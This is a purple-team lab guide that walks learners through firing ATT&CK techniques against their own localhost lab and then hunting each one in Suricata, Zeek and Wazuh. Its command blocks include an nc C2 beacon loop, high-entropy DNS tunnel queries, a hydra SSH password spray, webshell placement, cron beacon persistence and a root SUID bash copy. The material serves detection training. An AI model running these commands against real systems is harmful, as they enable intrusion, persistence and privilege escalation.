# Adversary Emulation — Using the Labs and Attacking Them

How to drive activity **against** the lab so detections and hunts have something
real to find. Two loops:

```
  BLUE:  deploy sensors  ->  wait
  RED :  run an attack step
  BLUE:  see it in Suricata / Zeek / auth.log / Wazuh
  BLUE:  hunt it, then write a detection so it never sneaks past again
```

> **Scope / authorization.** Every technique here targets `127.0.0.1`, the lab's
> own containers, files under a lab `./work/` tree, or `testmyids.com` (a public
> service built for exactly this). Do not point any of it at anything else.

---

## 0 · Stand up the target

| Lab | What it is | Start |
|-----|-----------|-------|
| `labs/` network stack | Suricata + Zeek + ntopng (+ ELK) | `./setup.sh` (or `./setup-lite.sh`) |
| `labs/class-11-threat-hunting/` | Compromised-host file/log hunt | `./setup.sh` **or** `./attack.sh` |

Watch panes (keep these open while you attack):

```bash
# network stack
tail -f labs/suricata/logs/eve.json | jq 'select(.event_type=="alert") | {ts:.timestamp, sig:.alert.signature, src:.src_ip, dst:.dest_ip}'
tail -f labs/zeek/logs/current/conn.log | zeek-cut id.orig_h id.resp_h id.resp_p duration orig_bytes

# host signals
sudo tail -f /var/log/auth.log
sudo tail -f /var/ossec/logs/alerts/alerts.json | jq '{rule:.rule.description, id:.rule.id, src:.data.srcip}'
```

---

## 1 · The scripted attack chain (Class 11 lab)

`labs/class-11-threat-hunting/attack.sh` performs an 8-stage intrusion into
`./work/`, narrating each stage with its ATT&CK ID and the sensor/hunt that
catches it. Then you hunt it.

```bash
cd labs/class-11-threat-hunting
./attack.sh            # emulate the intrusion (offline, safe)
./attack.sh --live     # ALSO fire real lab-scoped noise (scan localhost, GET testmyids, DNS, beacon)
./hunt.sh -s           # switch hats: hunt it down, step by step
./attack.sh clean      # reset
```

| Stage | ATT&CK | Caught by |
|-------|--------|-----------|
| 1 Recon / port scan | T1595.001, T1046 | Suricata `ET SCAN` |
| 2 SSH password spray | T1110.003 | `auth.log` burst / Wazuh 5710+ |
| 3 Webshell upload | T1190 → T1505.003 | YARA hunt 1 / FIM on `/var/www` |
| 4 Webshell command exec | T1059, T1082 | hunt 2 (bad IP in web log) |
| 5 Second-stage download | T1105 | hunt 2 / Suricata ET on the payload URL |
| 6 SUID + `/dev/shm` persistence | T1548.001, T1547, T1620 | hunts 4 & 5 |
| 7 Long-interval HTTPS beacon | T1071.001, T1573 | hunt 3 (Zeek long-conn) |
| 8 Log rollover | T1070 | hunt 2 uses `zgrep` on archives |

---

## 2 · Manual technique cookbook (network stack)

Run these one at a time against the running Suricata/Zeek stack and watch the
alert pane. Each is safe and lab-scoped.

### T1046 — Network Service Discovery
```bash
nmap -sT -p- 127.0.0.1
nmap -sS -T4 127.0.0.1        # SYN scan — triggers ET SCAN portscan rules
```
**See:** Suricata `ET SCAN Potential ... Scan`, Zeek many short conns from one src.

### T1071.001 / T1573 — C2 over HTTP(S), beaconing
```bash
# terminal A: fake C2 listener
nc -lk 9999
# terminal B: beacon every 30s with a tiny payload
while true; do echo "checkin $(date +%s)" | nc -w2 127.0.0.1 9999; sleep 30; done
```
**See:** Zeek `conn.log` — repeated same-size, same-dst, regular-interval sessions.
This is the pattern hunt 3 looks for. Let it run 5+ minutes.

### T1071.004 — DNS as a covert channel
```bash
for i in $(seq 1 20); do
  dig +short "$(head -c16 /dev/urandom | base32 | tr -d = | tr 'A-Z' 'a-z').tunnel.lab" @127.0.0.1 >/dev/null
done
```
**See:** Zeek `dns.log` — many long, high-entropy subdomains to one zone.

### T1105 — Ingress tool transfer / known IDS test
```bash
curl -s http://testmyids.com               # returns: uid=0(root) gid=0(root) groups=0(root)
```
**See:** Suricata `GPL ATTACK_RESPONSE id check returned root` — the canonical
"my IDS works" alert.

### T1110 — SSH brute force (against your own box only)
```bash
sudo apt install -y hydra
# tiny wordlist, localhost only
printf 'admin\nroot\ntest\n' > /tmp/u.txt
printf 'password\n123456\nletmein\nadmin\n' > /tmp/p.txt
hydra -L /tmp/u.txt -P /tmp/p.txt ssh://127.0.0.1 -t 4 -f
```
**See:** `/var/log/auth.log` "Failed password" burst; Wazuh rule 5710/5712;
fail2ban ban if enabled (Class 12).

### T1190 / T1505.003 — Web shell
```bash
mkdir -p /tmp/webroot/uploads
cp labs/class-11-threat-hunting/scenario/webshell.php /tmp/webroot/uploads/
yara -r labs/class-11-threat-hunting/rules/hunt_webshell.yar /tmp/webroot/
```
**See:** YARA match; if you have FIM/auditd on the web root, a file-create event.

### T1082 / T1087 / T1033 — Discovery (host telemetry, needs auditd)
```bash
sudo auditctl -w /etc/passwd -p r -k recon
uname -a; id; whoami; cat /etc/passwd | cut -d: -f1; getent group sudo
sudo ausearch -k recon --format text | tail
```
**See:** auditd `recon` key hits; Wazuh/Sysmon-for-Linux process events.

### T1053 — Scheduled task / cron persistence
```bash
( crontab -l 2>/dev/null; echo "*/5 * * * * curl -s http://127.0.0.1:9999/beacon" ) | crontab -
crontab -l
crontab -r        # clean up
```
**See:** auditd watch on `/var/spool/cron`, osquery `crontab` table diff.

### T1548.001 — SUID persistence
```bash
cp /bin/bash /tmp/.rootbash && sudo chown root:root /tmp/.rootbash && sudo chmod 4755 /tmp/.rootbash
find / -xdev -perm -4000 -type f 2>/dev/null | grep -v -f /etc/soc/suid_baseline.txt   # diff vs baseline
sudo rm /tmp/.rootbash
```

---

## 3 · Do it properly — Atomic Red Team

For a repeatable, catalogued library instead of hand-rolled commands:

```bash
sudo apt install -y powershell
pwsh -c "Install-Module -Name invoke-atomicredteam -Scope CurrentUser -Force"
pwsh -c "Import-Module invoke-atomicredteam; Invoke-AtomicTest T1046 -GetPrereqs; Invoke-AtomicTest T1046"
pwsh -c "Invoke-AtomicTest T1046 -Cleanup"
```

Or full multi-stage chains with CALDERA:

```bash
git clone https://github.com/mitre/caldera.git --recursive /opt/caldera
cd /opt/caldera && python3 server.py --insecure    # http://localhost:8888  (red/admin)
```

---

## 4 · Close every loop

For each technique you fire:

1. **Did a sensor see it?** If not — is the data source even being collected? (visibility gap)
2. **Did an alert fire?** If not — write/tune the rule (Sigma → `sigma convert`), test with `wazuh-logtest`.
3. **Could a hunt have found it cold?** Add it to the hunt playbook with a query.
4. **Record it:** technique, date run, detected Y/N, rule ID. That table is your
   detection-coverage map against ATT&CK.

> A purple-team exercise that ends without a new or tuned detection was just a demo.
